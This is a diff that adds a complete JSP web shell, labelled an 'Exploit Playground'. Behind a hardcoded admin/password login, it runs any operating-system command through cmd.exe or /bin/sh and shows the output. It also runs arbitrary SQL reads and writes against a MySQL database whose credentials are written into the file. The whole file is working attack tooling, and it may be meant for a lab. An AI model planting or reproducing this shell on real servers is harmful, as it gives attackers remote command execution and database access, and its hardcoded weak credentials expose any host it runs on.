@@ -1,0 +1,153 @@
+<%@page import="java.util.*, java.io.*, java.sql.*, javax.servlet.jsp.*"%>
+<%@page pageEncoding="UTF-8"%>
+<%!
+// 🛠️ DATABASE CONNECTION DETAILS
+final String DB_DRIVER = "com.mysql.cj.jdbc.Driver";
+final String DB_URL = "jdbc:mysql://my-mysql:3306/webshell?useSSL=false&serverTimezone=UTC";
+final String DB_USER = "user";
+final String DB_PASS = "password";
+
+// 🛠️ JDBC Driver Load Status
+boolean isJdbcLoaded;
+%>
+
+<%
+try {
+    Class.forName(DB_DRIVER);
+    isJdbcLoaded = true;
+} catch (ClassNotFoundException e) {
+    isJdbcLoaded = false;
+}
+%>
+
+<%!
+// 🛠️ LOGIN AUTHENTICATION (Access Key Required)
+boolean checkLogin(HttpSession session, HttpServletRequest request) {
+    final String USER = "admin";
+    final String PASS = "password";
+    if (session.getAttribute("ID") != null) return true;
+    
+    String user = request.getParameter("user");
+    String pass = request.getParameter("pass");
+    
+    if (user != null && pass != null && user.equals(USER) && pass.equals(PASS)) {
+        session.setAttribute("ID", "1");
+        return true;
+    }
+    return false;
+}
+
+// 🛠️ EXECUTE COMMANDS (Welcome to the Shell)
+void execCmd(JspWriter out, String command) throws Exception {
+    if (command == null || command.trim().isEmpty()) return;
+
+    String os = System.getProperty("os.name").toLowerCase();
+    ProcessBuilder builder;
+
+    if (os.contains("win")) {
+        builder = new ProcessBuilder("cmd.exe", "/c", command);
+    } else {
+        builder = new ProcessBuilder("/bin/sh", "-c", command);
+    }
+
+    builder.redirectErrorStream(true);
+    Process process = builder.start();
+    
+    BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
+    String line;
+    out.print("<pre>");
+    while ((line = reader.readLine()) != null) {
+        out.println(line);
+    }
+    out.print("</pre>");
+}
+
+// 🛠️ EXECUTE SQL QUERIES (Database Intrusion)
+void executeSQL(JspWriter out, String sql) throws Exception {
+    if (sql == null || sql.trim().isEmpty()) {
+        out.print("<p>⚠️ No SQL input detected. Try harder.</p>");
+        return;
+    }
+
+    if (!isJdbcLoaded) {
+        out.print("<p>🚨 Failed to load JDBC driver. Check your environment.</p>");
+        return;
+    }
+
+    try (Connection con = DriverManager.getConnection(DB_URL, DB_USER, DB_PASS);
+         Statement stmt = con.createStatement()) {
+        if (sql.trim().toLowerCase().startsWith("select")) {
+            ResultSet rs = stmt.executeQuery(sql);
+            ResultSetMetaData rsmd = rs.getMetaData();
+            int columns = rsmd.getColumnCount();
+            out.print("<table border=1><tr>");
+            for (int i = 1; i <= columns; i++) out.print("<th>" + rsmd.getColumnName(i) + "</th>");
+            out.print("</tr>");
+            while (rs.next()) {
+                out.print("<tr>");
+                for (int i = 1; i <= columns; i++) out.print("<td>" + rs.getString(i) + "</td>");
+                out.print("</tr>");
+            }
+            out.print("</table>");
+        } else {
+            int updateCount = stmt.executeUpdate(sql);
+            out.print("✅ SQL Query Executed (" + updateCount + " rows affected)");
+        }
+    }
+}
+%>
+
+<%
+if (!checkLogin(session, request)) {
+    out.print("<center><form method='post'>");
+    out.print("<h2>🔑 Enter Access Key</h2>");
+    out.print("<input name='user' placeholder='Username'><br>");
+    out.print("<input name='pass' type='password' placeholder='Password'><br>");
+    out.print("<input type='submit' value='Authenticate'>");
+    out.print("</form></center>");
+    return;
+}
+
+// Logout functionality
+if (request.getParameter("logout") != null) {
+    session.invalidate();
+    response.sendRedirect("webshell.jsp");
+    return;
+}
+
+String action = request.getParameter("action");
+out.print("<h1>🛠️ JSP WebShell - Exploit Playground</h1>");
+out.print("<p><a href='?logout=true'>🔴 Terminate Session</a></p>");
+
+// 🛠️ Check JDBC driver load status
+if (isJdbcLoaded) {
+    out.print("<p>✅ Database Tunnel Opened</p>");
+} else {
+    out.print("<p>🚨 Database Access Denied</p>");
+}
+
+out.print("<form method='post' onchange='toggleFields()'><select name='action' id='actionSelect'>");
+out.print("<option value='cmd' " + ("cmd".equals(action) ? "selected" : "") + ">💻 Remote Shell</option>");
+out.print("<option value='db' " + ("db".equals(action) ? "selected" : "") + ">📂 Database Query</option>");
+out.print("</select>");
+
+out.print("<br><div id='cmdField'><input type='text' name='command' placeholder='Enter command'></div>");
+
+out.print("<div id='dbFields' style='display:none;'><h2>📂 SQL Console</h2>");
+out.print("<br>Query: <input type='text' name='sql' placeholder='Enter SQL query'>");
+out.print("</div>");
+
+out.print("<br><input type='submit' value='Execute'></form>");
+
+out.print("<script>");
+out.print("function toggleFields() {");
+out.print("  let action = document.getElementById('actionSelect').value;");
+out.print("  document.getElementById('cmdField').style.display = action === 'cmd' ? 'block' : 'none';");
+out.print("  document.getElementById('dbFields').style.display = action === 'db' ? 'block' : 'none';");
+out.print("}");
+out.print("toggleFields();");
+out.print("</script>");
+
+if ("cmd".equals(action)) execCmd(out, request.getParameter("command"));
+if ("db".equals(action)) executeSQL(out, request.getParameter("sql"));
+%>
